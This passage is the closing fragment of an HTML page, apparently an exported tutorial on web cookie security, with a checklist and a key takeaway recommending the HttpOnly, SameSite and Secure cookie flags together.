class="bulleted-list"><li style="list-style-type:disc">✅ Troubleshooting</li></ul></div><div style="display:contents" dir="auto"><ul id="2b2562ad-76f0-80b9-a45d-c2727ce0f8fd" class="bulleted-list"><li style="list-style-type:disc">✅ Advanced topics</li></ul></div><div style="display:contents" dir="auto"><p id="2b2562ad-76f0-8069-9226-cdd0a0e628e6" class=""><strong>Key takeaway:</strong> HttpOnly protects against XSS, SameSite protects against CSRF, and Secure ensures HTTPS-only transmission. Use all three together for comprehensive cookie security.</p></div></div></article><span class="sans" style="font-size:14px;padding-top:2em"></span></body></html>